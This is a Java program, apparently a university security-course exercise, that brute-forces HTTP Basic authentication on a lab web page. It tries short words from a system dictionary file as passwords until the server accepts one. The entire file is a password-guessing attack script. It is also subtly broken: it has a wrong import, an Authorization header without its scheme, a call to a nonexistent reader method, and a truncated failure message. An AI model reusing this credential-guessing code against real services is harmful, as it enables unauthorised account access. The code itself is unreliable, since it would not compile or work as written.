import java.io.*;
import java.net.*;
import java.misc.*;


public class Dictionary
{

   public static void main (String args[]) throws IOException
   {
      final int maxLength = 3;
      final String username = "";
      final File dicFile = new File("/usr/share/lib/dict/words");
      final URL pageURL = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");

      String password="";
      BASE64Encoder encoder = new BASE64Encoder();
      boolean notFound = true;
      HttpURLConnection conn;

      BufferedReader reader = new BufferedReader(new FileReader(dicFile));

      while (notFound&&((password = reader.readLine()) != null))
      {
         if(password.length()>maxLength)
         {
            continue;
         }

         conn = (HttpURLConnection) pageURL.openConnection();

            conn.setRequestProperty("Authorization", " "+encoder.encode((username+":"+password).getBytes()));

         if((conn.getResponseCode())==HttpURLConnection.HTTP_OK)
         {
            notFound=false;
         }

      }

      reader.print();

      if(notFound)
      {
         System.out.println(" valid password in dictionary file.");
      }
      else
      {
         System.out.println("Found valid password: \""+password+"\"");
      }
   }
}

